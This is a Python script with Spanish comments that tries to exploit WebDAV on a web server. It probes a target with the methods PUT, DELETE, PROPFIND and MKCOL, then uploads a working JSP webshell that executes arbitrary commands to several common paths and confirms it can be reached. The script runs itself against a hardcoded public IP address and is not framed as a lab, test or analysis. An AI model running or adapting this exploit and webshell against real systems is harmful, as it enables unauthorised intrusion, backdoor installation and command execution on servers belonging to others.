import requests
import base64
import sys

class WebDAVExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
    
    def test_webdav_upload(self):
        """Probar subida de archivos via WebDAV"""
        print("[+] Probando upload WebDAV...")
        
        # Webshell JSP básica
        webshell = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
        out.println(line);
    }
}
%>
<form method="post">
CMD: <input type="text" name="cmd" size="50" value="whoami">
<input type="submit" value="Execute">
</form>'''
        
        # Varias ubicaciones para probar
        upload_locations = [
            '/webdav/shell.jsp',
            '/examples/webdav/shell.jsp',
            '/shell.jsp',
            '/test/shell.jsp',
            '/uploads/shell.jsp'
        ]
        
        for location in upload_locations:
            try:
                url = f"{self.target}{location}"
                print(f"Intentando upload a: {url}")
                
                # Método PUT
                response = self.session.request('PUT', url, data=webshell)
                print(f"PUT Response: {response.status_code}")
                
                if response.status_code in [200, 201, 204]:
                    print(f"[SUCCESS] Webshell subida: {url}")
                    
                    # Verificar acceso
                    verify_response = self.session.get(url)
                    if verify_response.status_code == 200:
                        print(f"[SUCCESS] Webshell accesible: {url}")
                        return url
                else:
                    print(f"PUT failed: {response.status_code}")
                    
            except Exception as e:
                print(f"Error: {e}")
        
        return None
    
    def exploit_webdav(self):
        """Explotación completa de WebDAV"""
        print("=== EXPLOTACIÓN WEBDAV ===")
        
        # Probar diferentes métodos
        methods = ['PUT', 'DELETE', 'PROPFIND', 'MKCOL']
        for method in methods:
            try:
                response = self.session.request(method, self.target)
                print(f"{method}: {response.status_code}")
            except Exception as e:
                print(f"{method}: Error - {e}")
        
        # Intentar upload
        return self.test_webdav_upload()

# Ejecutar
webdav = WebDAVExploiter("http://189.254.143.102")
webdav.exploit_webdav()